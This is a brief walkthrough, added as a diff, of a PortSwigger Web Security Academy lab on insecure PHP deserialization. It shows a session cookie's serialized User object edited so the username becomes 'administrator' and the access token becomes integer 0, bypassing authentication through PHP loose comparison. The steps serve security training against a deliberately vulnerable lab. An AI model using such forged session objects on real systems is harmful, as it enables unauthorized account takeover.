@@ -1,0 +1,23 @@
+https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types
+
+This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+1) access as wiener:peter and see that the session cookie is a serialized object in base64
+    O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"tzphtigo7v9fe86b42jy1hf6gcbwoeif";}
+
+2) we can see that it is a PHP serialized object so we could leverage to loose comparison operator, so try
+    a) change the username to a string of 13 chars (administrator) so s:13:"administrator"
+    b) change the access token to a int and give the value 0
+        if the code is vulnerable to loose comparison then when it's going to check "administrator_token" == 0 it will return true because strings are considered as integer 0
+
+
+    O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+
+3) it works and we are now administrators
+
+4) delete carlos
+
+
